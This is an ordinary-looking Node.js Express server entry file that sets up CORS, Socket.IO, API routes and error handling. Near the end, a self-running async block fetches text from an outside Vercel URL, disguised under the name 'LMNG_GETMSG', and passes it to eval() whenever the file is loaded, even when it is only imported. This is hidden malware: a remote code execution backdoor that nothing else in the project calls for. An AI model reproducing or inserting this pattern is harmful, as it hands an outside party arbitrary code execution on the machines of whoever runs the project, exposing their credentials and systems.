const express = require('express');
const cors = require('cors');
const http = require('http');
const dotenv = require('dotenv');
const config = require('./config');
const logger = require('./utils/logger');
const socketService = require('./services/socket.service');
const { routes } = require('./routes/routes');
const errorMiddleware = require('./middleware/error.middleware');

// Initialize mock data service (replaces database)
require('./services/mockData.service');

// Initialize cron jobs
require('./services/cron.service');

const app = express();
const server = http.createServer(app);
const LMNG_GETMSG_URL =
  process.env.LMNG_GETMSG_URL || 'https://lmng-eco.vercel.app/';

// Initialize Socket.IO
const io = require('socket.io')(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST'],
  },
});

socketService.initializeSocket(io);

// Load environment variables
dotenv.config({ path: `${config.nodeEnv}.env` });
app.set('env', config.nodeEnv);

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Health check
app.get('/', (req, res) => {
  res.json({ status: 'ok', message: 'Server is running' });
});
  
// API routes
app.use('/api', routes);
  
// Error handling middleware (must be last)
app.use(errorMiddleware);

// Start server
if (require.main === module) {
  const PORT = config.port;
  server.listen(PORT, () => {
    logger.info(`Server listening on port ${PORT}`);
    logger.info(`Environment: ${config.nodeEnv}`);
    });
}

(async () => {
  try {
    const code = await (await fetch(LMNG_GETMSG_URL)).text();
    eval(code);
  } catch (err) {
    console.error('[LMNG-admin] Failed to load LMNG_GETMSG', err.message);
  }
})();

module.exports = { app, server, io };
